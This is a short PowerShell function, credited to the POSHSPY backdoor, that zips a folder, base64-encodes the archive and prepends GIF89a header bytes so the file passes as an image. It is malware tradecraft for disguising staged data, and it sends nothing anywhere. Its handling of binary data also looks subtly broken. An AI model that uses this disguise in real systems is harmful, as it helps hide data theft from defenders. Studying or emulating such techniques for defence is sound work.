# This code was derived from https://github.com/matthewdunwoody/POSHSPY

function zip( $zipfilename, $sourcedir )
{
   Add-Type -Assembly System.IO.Compression.FileSystem
   $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
   [System.IO.Compression.ZipFile]::CreateFromDirectory($sourcedir, $zipfilename, $compressionLevel, $false)
   Start-Sleep -s 3
   	$fileContent = get-content $zipfilename
	$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
	$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
	$fileContentEncoded | set-content $zipfilename
	[Byte[]] $x = 0x47,0x49,0x46,0x38,0x39,0x61
	$save = get-content $zipfilename
	$x | set-content $zipfilename -Encoding Byte
	add-content $zipfilename $save
}